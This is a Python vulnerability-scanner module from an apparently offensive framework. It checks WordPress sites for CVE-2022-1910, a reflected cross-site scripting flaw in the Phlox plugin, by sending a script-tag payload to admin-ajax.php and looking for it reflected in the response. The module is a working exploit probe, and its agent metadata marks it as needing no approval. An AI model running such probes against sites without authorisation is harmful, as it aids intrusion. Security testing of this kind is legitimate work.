#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress Shortcodes and extra features plugin for the Phlox theme before 2."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress Shortcodes and Extra Features for Phlox <2.9.8 - Cross-Site Scripting Detection',
        'description': 'WordPress Shortcodes and extra features plugin for the Phlox theme before 2.9.8 contains a cross-site scripting vulnerability. The plugin does not sanitize and escape a parameter before outputting it back in the response. An attacker can inject arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'wordpress', 'xss', 'auxin-elements', 'wpscan', 'wp-plugin', 'wp', 'averta', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://wpscan.com/vulnerability/8afe1638-66fa-44c7-9d02-c81573193b47',
            'https://wordpress.org/plugins/auxin-elements/',
            'https://nvd.nist.gov/vuln/detail/CVE-2022-1910',
            'https://github.com/ARPSyndicate/cvemon',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2022-1910',
    }

    def run(self):
        r = self.http_request(method="GET", path='/wp-admin/admin-ajax.php?action=aux_the_recent_products&data[wp_query_args][post_type]=post&data[title]=%3Cscript%3Ealert(document.domain)%3C/script%3E', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('widget-title"><script>alert(document.domain)</script></h3>', 'aux-widget',)
        header_any = ('text/html',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="WordPress Shortcodes and Extra Features for Phlox <2.9.8 - Cross-Site Scripting detected",
                path='/wp-admin/admin-ajax.php?action=aux_the_recent_products&data[wp_query_args][post_type]=post&data[title]=%3Cscript%3Ealert(document.domain)%3C/script%3E',
            )
            return True
        return False

